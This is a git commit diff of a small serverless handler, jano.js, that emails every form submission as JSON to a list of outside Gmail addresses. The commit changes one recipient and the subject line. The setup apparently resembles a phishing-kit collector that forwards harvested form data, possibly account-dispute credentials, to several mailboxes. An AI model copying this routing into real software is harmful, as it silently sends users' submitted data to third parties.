11b08849e7cac635e579d2b2796e2795ed28c1a6
zm9807350 <zm9807350@gmail.com>
2026-03-24 15:07:36 +0500

    Update jano.js

--- jano.js
+++ jano.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
   try {
     await transporter.sendMail({
       from: `"PROFESSOR" <dardhame1@gmail.com>`,
-      to: "linkquarry@gmail.com,submitdispute@gmail.com,newzatpage@gmail.com,janojaan5744@gmail.com",
-      subject: "jano",
+      to: "linkquarry@gmail.com,submitdispute@gmail.com,newzatpage@gmail.com,abdullahnizamani330@gmail.com",
+      subject: "ABDULLAH",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>New submission from Asif</h3><pre>${JSON.stringify(
         formData,
